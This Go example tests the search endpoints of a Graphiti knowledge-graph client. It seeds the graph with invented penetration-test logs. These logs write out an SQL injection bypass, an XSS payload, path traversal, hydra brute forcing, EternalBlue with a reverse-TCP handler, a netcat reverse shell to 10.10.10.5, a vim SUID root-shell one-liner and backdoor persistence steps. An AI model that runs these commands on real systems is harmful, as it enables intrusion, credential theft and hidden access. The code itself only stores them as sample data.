package main

import (
	"fmt"
	"log"
	"strings"
	"time"

	graphiti "github.com/vxcontrol/graphiti-go-client"
)

// This example demonstrates the advanced search capabilities of the Graphiti Go client.
// It matches the logic of graphiti/server/test_advanced_search.py exactly.

const (
	groupID = "pentest-demo-2024"
)

func main() {
	// Create a client
	client := graphiti.NewClient("http://localhost:8000", graphiti.WithTimeout(60*time.Second))

	// Health check
	fmt.Println("\n" + strings.Repeat("=", 80))
	fmt.Println("Graphiti Advanced Search Endpoints Test Suite")
	fmt.Println(strings.Repeat("=", 80) + "\n")

	fmt.Printf("ℹ Server: http://localhost:8000\n")
	fmt.Printf("ℹ Group ID: %s\n", groupID)

	fmt.Println("ℹ Checking server health...")
	health, err := client.HealthCheck()
	if err != nil {
		log.Fatalf("✗ Server is not accessible: %v\nPlease ensure the server is running", err)
	}
	fmt.Printf("✓ Server is running (status: %s)\n\n", health.Status)

	// Add test data
	if !addTestData(client) {
		log.Fatal("Failed to add test data")
	}

	// Run all search tests
	testTemporalWindowSearch(client)
	testEntityRelationshipsSearch(client)
	testDiverseResultsSearch(client)
	testEpisodeContextSearch(client)
	testSuccessfulToolsSearch(client)
	testRecentContextSearch(client)
	testEntityByLabelSearch(client)

	fmt.Println("\n" + strings.Repeat("=", 80))
	fmt.Println("Test Suite Complete")
	fmt.Println(strings.Repeat("=", 80) + "\n")
	fmt.Println("✓ All 7 search endpoints have been tested!")
	fmt.Println("ℹ Check the output above for results from each endpoint")
}

func addTestData(client *graphiti.Client) bool {
	fmt.Println("\n" + strings.Repeat("=", 80))
	fmt.Println("STEP 1: Adding Test Data to Graphiti")
	fmt.Println(strings.Repeat("=", 80) + "\n")

	now := time.Now().UTC()

	// Test data: Realistic penetration testing scenario (matches Python version exactly)
	messages := []graphiti.Message{
		// Phase 1: Reconnaissance (5 hours ago)
		{
			Author: "pentester",
			Name:   "recon-phase-1",
			Content: `Starting reconnaissance phase on target network 192.168.1.0/24
        
Running nmap scan: nmap -sV -sC -p- 192.168.1.0/24

Discovered hosts:
- 192.168.1.10: Linux server, ports 22 (SSH), 80 (HTTP), 443 (HTTPS)
- 192.168.1.20: Windows server, ports 445 (SMB), 3389 (RDP), 1433 (MSSQL)
- 192.168.1.30: Web application server, ports 80 (HTTP), 8080 (HTTP-Alt)

SSH service on 192.168.1.10 is OpenSSH 7.4 - vulnerable to CVE-2018-15473 (user enumeration)
Web server on 192.168.1.10 is Apache 2.4.29 - vulnerable to CVE-2019-0211 (privilege escalation)
SMB on 192.168.1.20 is running SMBv1 - vulnerable to EternalBlue (MS17-010)`,
			SourceDescription: "agent:pentester task:recon-001",
			Timestamp:         now.Add(-5 * time.Hour),
		},
		// Phase 2: Web Application Testing (4 hours ago)
		{
			Author: "pentester",
			Name:   "webapp-test",
			Content: `Testing web application on 192.168.1.30:8080

Application: Online Store Management System v2.3
Technology Stack: PHP 7.2, MySQL 5.7, Apache 2.4

Vulnerability Discovery:
1. SQL Injection in login form - parameter: username
   Payload: admin' OR '1'='1'-- successfully bypassed authentication
   
2. XSS vulnerability in search functionality
   Payload: <script>alert('XSS')</script> executed successfully
   
3. File upload vulnerability - allows PHP shell upload
   Uploaded web shell to: /uploads/shell.php
   
4. Directory traversal in file download endpoint
   Payload: ../../../etc/passwd successfully retrieved`,
			SourceDescription: "agent:pentester task:web-app-test",
			Timestamp:         now.Add(-4 * time.Hour),
		},
		// Phase 3: Exploitation Attempts (3 hours ago)
		{
			Author: "pentester",
			Name:   "linux-exploit",
			Content: `Attempting exploitation on 192.168.1.10

1. SSH User Enumeration (CVE-2018-15473):
   - Confirmed users: root, admin, webmaster, backup
   - Tool: ssh-user-enum.py
   - Result: SUCCESS

2. Brute Force Attack on SSH:
   - Tool: hydra -l admin -P rockyou.txt ssh://192.168.1.10
   - Found credentials: admin:password123
   - Result: SUCCESS - gained SSH access

3. Apache Privilege Escalation (CVE-2019-0211):
   - Uploaded exploit to /tmp/apache_exploit.c
   - Compiled and executed
   - Result: SUCCESS - gained root access
   - Created backdoor user: pentest:$hidden$`,
			SourceDescription: "agent:pentester task:exploit-linux",
			Timestamp:         now.Add(-3 * time.Hour),
		},
		// Phase 4: Windows Exploitation (2 hours ago)
		{
			Author: "pentester",
			Name:   "windows-exploit",
			Content: `Attempting exploitation on Windows server 192.168.1.20

1. EternalBlue Exploitation (MS17-010):
   - Tool: Metasploit exploit/windows/smb/ms17_010_eternalblue
   - Payload: windows/x64/meterpreter/reverse_tcp
   - LHOST: 10.10.10.5, LPORT: 4444
   - Result: SUCCESS - Meterpreter session established

2. Post-Exploitation Activities:
   - Dumped SAM hashes: hashdump
   - Found admin password hash: Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
   - Cracked with hashcat: password = Admin@2024
   
3. Lateral Movement:
   - Used PsExec to access MSSQL server
   - Extracted database credentials
   - Found sensitive customer data in sales_db`,
			SourceDescription: "agent:pentester task:exploit-windows",
			Timestamp:         now.Add(-2 * time.Hour),
		},
		// Phase 5: Web Shell Usage (1 hour ago)
		{
			Author: "pentester",
			Name:   "webshell-usage",
			Content: `Using web shell on 192.168.1.30 for persistence and data exfiltration

Web Shell: /uploads/shell.php
Access URL: http://192.168.1.30:8080/uploads/shell.php?cmd=

Commands executed:
1. whoami → www-data
2. uname -a → Linux webapp01 4.15.0-112-generic
3. cat /etc/passwd → Listed all system users
4. find / -name "*.conf" 2>/dev/null → Found config files
5. cat /var/www/html/config.php → Retrieved DB credentials
   - DB_HOST: localhost
   - DB_USER: webapp_user
   - DB_PASS: WebApp@Pass2024
   - DB_NAME: store_db

6. mysql -u webapp_user -p store_db -e "SELECT * FROM users;" → Extracted user data
7. Downloaded /var/log/apache2/access.log for analysis

Established reverse shell: nc -e /bin/bash 10.10.10.5 5555`,
			SourceDescription: "agent:pentester task:web-shell-usage",
			Timestamp:         now.Add(-1 * time.Hour),
		},
		// Phase 6: Privilege Escalation Attempts (30 minutes ago)
		{
			Author: "pentester",
			Name:   "privesc-webapp",
			Content: `Privilege escalation attempts on 192.168.1.30

Current user: www-data

1. SUID Binaries Check:
   find / -perm -4000 2>/dev/null
   Found interesting SUID binaries:
   - /usr/bin/find (exploitable with GTFOBins)
   - /usr/bin/vim.basic (exploitable)
   
2. Sudo Permissions:
   sudo -l
   User www-data may run: (ALL) NOPASSWD: /usr/bin/systemctl restart nginx
   
3. Kernel Exploit Check:
   Linux 4.15.0-112-generic - vulnerable to CVE-2021-3493 (OverlayFS)
   
4. Successful Privilege Escalation:
   - Used vim SUID exploit
   - Executed: vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "bash", "-p")'
   - Result: SUCCESS - root shell obtained
   
5. Post-Root Actions:
   - Created persistent backdoor in /etc/rc.local
   - Added SSH key to /root/.ssh/authorized_keys
   - Modified iptables to allow persistent access`,
			SourceDescription: "agent:pentester task:privesc-webapp",
			Timestamp:         now.Add(-30 * time.Minute),
		},
		// Phase 7: Recent Activity (5 minutes ago)
		{
			Author: "pentester",
			Name:   "final-report",
			Content: `Final penetration test summary and cleanup recommendations

SUMMARY OF FINDINGS:

Critical Vulnerabilities (3):
1. CVE-2019-0211 - Apache Privilege Escalation on 192.168.1.10
2. MS17-010 - EternalBlue on 192.168.1.20
3. SQL Injection on 192.168.1.30:8080 login form

High Vulnerabilities (4):
1. CVE-2018-15473 - SSH User Enumeration on 192.168.1.10
2. Weak credentials across all systems
3. File upload vulnerability on 192.168.1.30
4. XSS vulnerability on 192.168.1.30

SUCCESSFUL TECHNIQUES:
- nmap for reconnaissance (used 7 times)
- Metasploit EternalBlue exploit (100% success)
- SQL injection for authentication bypass (3 attempts, 3 successful)
- Web shell deployment (successful on first attempt)
- SUID binary exploitation for privilege escalation (successful)
- Hydra for credential brute forcing (successful after 15 minutes)

RECOMMENDATIONS:
1. Immediately patch Apache on 192.168.1.10
2. Disable SMBv1 on 192.168.1.20 and apply MS17-010 patch
3. Implement input validation on all web forms
4. Enforce strong password policy
5. Restrict file upload functionality
6. Implement WAF for XSS protection
7. Regular security audits and penetration testing`,
			SourceDescription: "agent:pentester task:final-report",
			Timestamp:         now.Add(-5 * time.Minute),
		},
	}

	fmt.Printf("ℹ Adding %d test messages...\n", len(messages))
	addResult, err := client.AddMessages(graphiti.AddMessagesRequest{
		GroupID:  groupID,
		Messages: messages,
	})
	if err != nil {
		fmt.Printf("✗ Failed to add test data: %v\n", err)
		return false
	}
	fmt.Printf("✓ Added %d messages to group: %s\n", len(messages), groupID)

	// Wait for processing (matches Python: 240 seconds = 4 minutes)
	fmt.Println("ℹ Waiting for Graphiti to process messages...")
	fmt.Println("ℹ This may take 4 minutes as it extracts entities and facts...")

	waitTime := 240 // 4 minutes
	for i := 0; i < waitTime/10; i++ {
		time.Sleep(10 * time.Second)
		elapsed := (i + 1) * 10
		fmt.Printf("ℹ Still processing... (%d/%d seconds elapsed)\n", elapsed, waitTime)
	}

	fmt.Printf("✓ Wait complete! Proceeding with tests after %d seconds (success: %v)\n\n", waitTime, addResult.Success)
	return true
}

func testTemporalWindowSearch(client *graphiti.Client) {
	fmt.Println("\n" + strings.Repeat("=", 80))
	fmt.Println("TEST 1: Temporal Window Search")
	fmt.Println(strings.Repeat("=", 80) + "\n")
	fmt.Println("ℹ Searching for activities between 4 and 2 hours ago...")

	now := time.Now().UTC()
	timeStart := now.Add(-4 * time.Hour)
	timeEnd := now.Add(-2 * time.Hour)

	result, err := client.TemporalWindowSearch(graphiti.TemporalSearchRequest{
		Query:      "vulnerability exploitation attempts",
		GroupID:    stringPtr(groupID),
		TimeStart:  timeStart,
		TimeEnd:    timeEnd,
		MaxResults: 10,
	})

	if err != nil {
		fmt.Printf("✗ Request failed: %v\n", err)
		return
	}

	fmt.Printf("✓ Found %d edges, %d nodes, %d episodes\n",
		len(result.Edges), len(result.Nodes), len(result.Episodes))
	fmt.Println("ℹ Sample results:")
	fmt.Printf("  - edges_count: %d\n", len(result.Edges))
	fmt.Printf("  - nodes_count: %d\n", len(result.Nodes))
	fmt.Printf("  - episodes_count: %d\n", len(result.Episodes))
	fmt.Printf("  - time_window: %s to %s\n",
		result.TimeWindow.Start.Format(time.RFC3339),
		result.TimeWindow.End.Format(time.RFC3339))

	if len(result.Episodes) > 0 {
		content := result.Episodes[0].Content
		if len(content) > 200 {
			content = content[:200] + "..."
		}
		fmt.Printf("  - sample_episode: %s\n", content)
	}
}

func testEntityRelationshipsSearch(client *graphiti.Client) {
	fmt.Println("\n" + strings.Repeat("=", 80))
	fmt.Println("TEST 2: Entity Relationships Search")
	fmt.Println(strings.Repeat("=", 80) + "\n")
	fmt.Println("ℹ First, finding an entity node UUID from the graph...")

	now := time.Now().UTC()
	timeStart := now.Add(-5 * time.Hour)
	timeEnd := now.Add(-1 * time.Hour)

	// First, do a temporal window search to get edges with node UUIDs
	tempResult, err := client.TemporalWindowSearch(graphiti.TemporalSearchRequest{
		Query:      "192.168.1.10 Linux server",
		GroupID:    stringPtr(groupID),
		TimeStart:  timeStart,
		TimeEnd:    timeEnd,
		MaxResults: 5,
	})

	if err != nil {
		fmt.Printf("✗ Request failed: %v\n", err)
		return
	}

	if len(tempResult.Edges) == 0 {
		fmt.Println("✗ No edges found to extract node UUID")
		return
	}

	// Get a node UUID from the first edge (use source_node_uuid)
	centerNodeUUID := tempResult.Edges[0].SourceNodeUUID
	if centerNodeUUID == "" {
		fmt.Println("✗ No source_node_uuid found in edge")
		return
	}

	if len(centerNodeUUID) > 16 {
		fmt.Printf("✓ Found center node UUID: %s...\n", centerNodeUUID[:16])
	} else {
		fmt.Printf("✓ Found center node UUID: %s\n", centerNodeUUID)
	}
	fmt.Println("ℹ Searching for relationships around this entity...")

	// Now perform the entity relationships search
	result, err := client.EntityRelationshipsSearch(graphiti.EntityRelationshipSearchRequest{
		Query:          "related entities and connections",
		GroupID:        stringPtr(groupID),
		CenterNodeUUID: centerNodeUUID,
		MaxDepth:       2,
		MaxResults:     20,
	})

	if err != nil {
		fmt.Printf("✗ Request failed: %v\n", err)
		return
	}

	fmt.Printf("✓ Found %d related edges, %d related nodes\n",
		len(result.Edges), len(result.Nodes))

	fmt.Println("ℹ Relationship graph:")
	centerName := "Unknown"
	if result.CenterNode != nil {
		centerName = result.CenterNode.Name
	}
	fmt.Printf("  - center_node: %s\n", centerName)
	fmt.Printf("  - edges_count: %d\n", len(result.Edges))
	fmt.Printf("  - nodes_count: %d\n", len(result.Nodes))
	fmt.Printf("  - max_depth_used: 2\n")

	if len(result.Nodes) > 0 {
		fmt.Printf("  - sample_related_node: %s\n", result.Nodes[0].Name)
	}
	if len(result.Edges) > 0 {
		fact := result.Edges[0].Fact
		if len(fact) > 150 {
			fact = fact[:150] + "..."
		}
		fmt.Printf("  - sample_edge: %s\n", fact)
	}
}

func testDiverseResultsSearch(client *graphiti.Client) {
	fmt.Println("\n" + strings.Repeat("=", 80))
	fmt.Println("TEST 3: Diverse Results Search (MMR)")
	fmt.Println(strings.Repeat("=", 80) + "\n")
	fmt.Println("ℹ Searching for diverse exploitation techniques and vulnerabilities...")

	result, err := client.DiverseResultsSearch(graphiti.DiverseSearchRequest{
		Query:          "CVE vulnerabilities and exploitation",
		GroupID:        stringPtr(groupID),
		DiversityLevel: "medium",
		MaxResults:     10,
	})

	if err != nil {
		fmt.Printf("✗ Request failed: %v\n", err)
		return
	}

	fmt.Printf("✓ Found %d diverse edges, %d nodes, %d episodes\n",
		len(result.Edges), len(result.Nodes), len(result.Episodes))
	fmt.Println("ℹ MMR ensures results are different from each other")

	fmt.Printf("  - edges_count: %d\n", len(result.Edges))
	fmt.Printf("  - nodes_count: %d\n", len(result.Nodes))
	fmt.Printf("  - episodes_count: %d\n", len(result.Episodes))

	if len(result.Edges) > 0 {
		fact := result.Edges[0].Fact
		if len(fact) > 150 {
			fact = fact[:150] + "..."
		}
		fmt.Printf("  - sample_edge: %s\n", fact)
	} else if len(result.Nodes) > 0 {
		fmt.Printf("  - sample_node: %s\n", result.Nodes[0].Name)
	} else if len(result.Episodes) > 0 {
		fmt.Printf("  - sample_episode_source: %s\n", result.Episodes[0].SourceDescription)
	}
}

func testEpisodeContextSearch(client *graphiti.Client) {
	fmt.Println("\n" + strings.Repeat("=", 80))
	fmt.Println("TEST 4: Episode Context Search")
	fmt.Println(strings.Repeat("=", 80) + "\n")
	fmt.Println("ℹ Searching for full agent responses about Metasploit...")

	result, err := client.EpisodeContextSearch(graphiti.EpisodeContextSearchRequest{
		Query:            "Metasploit EternalBlue exploitation",
		GroupID:          stringPtr(groupID),
		IncludeToolCalls: true,
		MaxResults:       5,
	})

	if err != nil {
		fmt.Printf("✗ Request failed: %v\n", err)
		return
	}

	fmt.Printf("✓ Found %d episodes\n", len(result.Episodes))
	fmt.Println("ℹ Episodes contain full agent responses with context")

	if len(result.Episodes) > 0 {
		episode := result.Episodes[0]
		content := episode.Content
		if len(content) > 300 {
			content = content[:300] + "..."
		}
		fmt.Printf("  - episode_uuid: %s\n", episode.UUID)
		fmt.Printf("  - source: %s\n", episode.Source)
		fmt.Printf("  - source_description: %s\n", episode.SourceDescription)
		fmt.Printf("  - content_preview: %s\n", content)
	}
}

func testSuccessfulToolsSearch(client *graphiti.Client) {
	fmt.Println("\n" + strings.Repeat("=", 80))
	fmt.Println("TEST 5: Successful Tools Search")
	fmt.Println(strings.Repeat("=", 80) + "\n")
	fmt.Println("ℹ Searching for frequently used successful tools...")

	result, err := client.SuccessfulToolsSearch(graphiti.SuccessfulToolsSearchRequest{
		Query:       "nmap reconnaissance scanning",
		GroupID:     stringPtr(groupID),
		MinMentions: 1,
		MaxResults:  15,
	})

	if err != nil {
		fmt.Printf("✗ Request failed: %v\n", err)
		return
	}

	fmt.Printf("✓ Found %d successful techniques\n", len(result.Edges))
	fmt.Println("ℹ Results ranked by mention frequency (higher = more successful)")

	topMentionCount := 0.0
	for _, count := range result.EdgeMentionCounts {
		if count > topMentionCount {
			topMentionCount = count
		}
	}

	fmt.Printf("  - edges_count: %d\n", len(result.Edges))
	fmt.Printf("  - nodes_count: %d\n", len(result.Nodes))
	fmt.Printf("  - top_mention_count: %.0f\n", topMentionCount)
}

func testRecentContextSearch(client *graphiti.Client) {
	fmt.Println("\n" + strings.Repeat("=", 80))
	fmt.Println("TEST 6: Recent Context Search")
	fmt.Println(strings.Repeat("=", 80) + "\n")
	fmt.Println("ℹ Searching for recent activities in the last 24 hours...")

	result, err := client.RecentContextSearch(graphiti.RecentContextSearchRequest{
		Query:         "privilege escalation and final summary",
		GroupID:       stringPtr(groupID),
		RecencyWindow: "24h",
		MaxResults:    10,
	})

	if err != nil {
		fmt.Printf("✗ Request failed: %v\n", err)
		return
	}

	fmt.Printf("✓ Found %d recent edges\n", len(result.Edges))
	fmt.Println("ℹ Results biased toward most recent activities")

	fmt.Printf("  - edges_count: %d\n", len(result.Edges))
	fmt.Printf("  - episodes_count: %d\n", len(result.Episodes))
	fmt.Printf("  - time_window: %s to %s\n",
		result.TimeWindow.Start.Format(time.RFC3339),
		result.TimeWindow.End.Format(time.RFC3339))

	if len(result.Episodes) > 0 {
		fmt.Printf("  - most_recent_episode: %s\n", result.Episodes[0].SourceDescription)
	}
}

func testEntityByLabelSearch(client *graphiti.Client) {
	fmt.Println("\n" + strings.Repeat("=", 80))
	fmt.Println("TEST 7: Entity By Label Search")
	fmt.Println(strings.Repeat("=", 80) + "\n")
	fmt.Println("ℹ Discovering entity labels in the graph...")

	now := time.Now().UTC()
	timeStart := now.Add(-6 * time.Hour)
	timeEnd := now

	// First, use temporal search to get some nodes and discover their labels
	tempResult, err := client.TemporalWindowSearch(graphiti.TemporalSearchRequest{
		Query:      "all entities",
		GroupID:    stringPtr(groupID),
		TimeStart:  timeStart,
		TimeEnd:    timeEnd,
		MaxResults: 15,
	})

	if err != nil {
		fmt.Printf("✗ Request failed: %v\n", err)
		return
	}

	nodes := tempResult.Nodes
	if len(nodes) == 0 {
		fmt.Println("✗ No nodes found to discover labels")
		return
	}

	// Collect all unique labels from returned nodes
	allLabelsMap := make(map[string]bool)
	for _, node := range nodes {
		if len(node.Labels) > 0 {
			for _, label := range node.Labels {
				allLabelsMap[label] = true
			}
		}
	}

	fmt.Printf("ℹ Found %d nodes in temporal search\n", len(nodes))

	// Prepare labels for entity-by-label search (required field)
	var searchLabels []string
	if len(allLabelsMap) > 0 {
		for label := range allLabelsMap {
			searchLabels = append(searchLabels, label)
		}
		fmt.Printf("ℹ Discovered labels: %v\n", searchLabels)
	} else {
		// Fallback to Entity label (default in Graphiti)
		searchLabels = []string{"Entity"}
		fmt.Println("ℹ No custom labels found, using default \"Entity\" label")
	}

	// Show sample entities
	fmt.Println("ℹ Sample entities from graph:")
	for i, node := range nodes {
		if i >= 5 {
			break
		}
		labels := node.Labels
		if len(labels) == 0 {
			labels = []string{"Entity"}
		}
		fmt.Printf("  - name: %s, labels: %v\n", node.Name, labels)
	}

	// Now perform entity-by-label search with discovered labels
	fmt.Printf("ℹ Testing entity-by-label search with labels: %v\n", searchLabels)

	result, err := client.EntityByLabelSearch(graphiti.EntityByLabelSearchRequest{
		Query:      "tools and systems",
		GroupID:    stringPtr(groupID),
		NodeLabels: searchLabels,
		MaxResults: 15,
	})

	if err != nil {
		fmt.Printf("✗ Request failed: %v\n", err)
		return
	}

	fmt.Printf("✓ Found %d nodes, %d edges\n", len(result.Nodes), len(result.Edges))

	if len(result.Nodes) > 0 {
		fmt.Println("ℹ Top entities by label:")
		for i, node := range result.Nodes {
			if i >= 5 {
				break
			}
			summary := node.Summary
			if len(summary) > 100 {
				summary = summary[:100] + "..."
			}
			fmt.Printf("  - name: %s, labels: %v, summary: %s\n",
				node.Name, node.Labels, summary)
		}
	}
}

func stringPtr(s string) *string {
	return &s
}
